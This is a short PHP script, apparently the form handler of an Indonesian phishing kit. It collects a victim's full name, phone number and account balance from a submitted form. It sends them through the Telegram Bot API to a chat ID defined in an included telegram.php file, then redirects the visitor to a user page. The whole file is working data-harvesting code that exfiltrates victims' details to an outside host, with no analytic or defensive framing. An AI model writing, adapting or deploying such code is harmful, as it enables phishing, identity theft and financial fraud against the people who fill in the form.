<?php
include "telegram.php";
session_start();

$nama = $_POST['nama'];
$nohp = $_POST['nohp'];
$saldo = $_POST['saldo'];

$_SESSION['nama'] = $nama;
$_SESSION['nohp'] = $nohp;
$_SESSION['saldo'] = $saldo;

$message = "
✧━━━━━━[ 𝚃𝙷𝙰𝙽𝙺 𝚈𝙾𝚄 ]━━━━━━✧

- 𝙽𝙰𝙼𝙰 𝙻𝙴𝙽𝙶𝙺𝙰𝙿 : ".$nama."
- 𝙽𝙾 𝙷𝙿 : ".$nohp."
- 𝚂𝙰𝙻𝙳𝙾 : ".$saldo."
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../user.html');
?>
